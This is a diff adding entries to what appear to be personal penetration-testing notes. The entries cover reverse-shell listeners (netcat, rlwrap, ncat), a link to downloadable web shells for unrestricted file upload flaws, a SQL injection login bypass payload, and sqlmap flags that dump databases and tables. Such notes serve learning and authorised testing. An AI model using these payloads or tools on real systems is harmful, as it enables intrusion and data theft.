@@ -65,3 +65,48 @@ Notice we need to spesify both the url and the domain! The --append-domain flag 
 
 
 Basic vHost enumeration:
+
+
+#### Netcat alternatives:
+
+- rlwarp with nc: `rlwarp nc -lvnp 443` Improves the shell, lets us use arrowkeys etc
+- Ncat: `ncat -lvnp 4444` improved netcat with SSL 
+
+
+#### Shell payloads:
+With unrestricted file upload vulnerability, we can upload one of these to get a web shell:
+https://www.r57shell.net/index.php
+
+
+
+#### SQL injection - SQLmap:
+
+Basic example:
+```
+
+Normal query: 
+SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
+
+SQL injection:
+Username: John
+Password: abc' OR 1=1;-- -
+
+SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
+```
+
+
+automate the task with sqlmap:
+
+```
+Basic synatx with get parameters:
+
+sqlmap -u "http://site?email=test&.." 
+
+Then we can add flags such as 
+--dbs: Databases 
+--tables: Tables 
+-D: Spesify a spesific database
+-T: Spesify a spesifc table 
+--dump: Dump the content of a table
+
+```
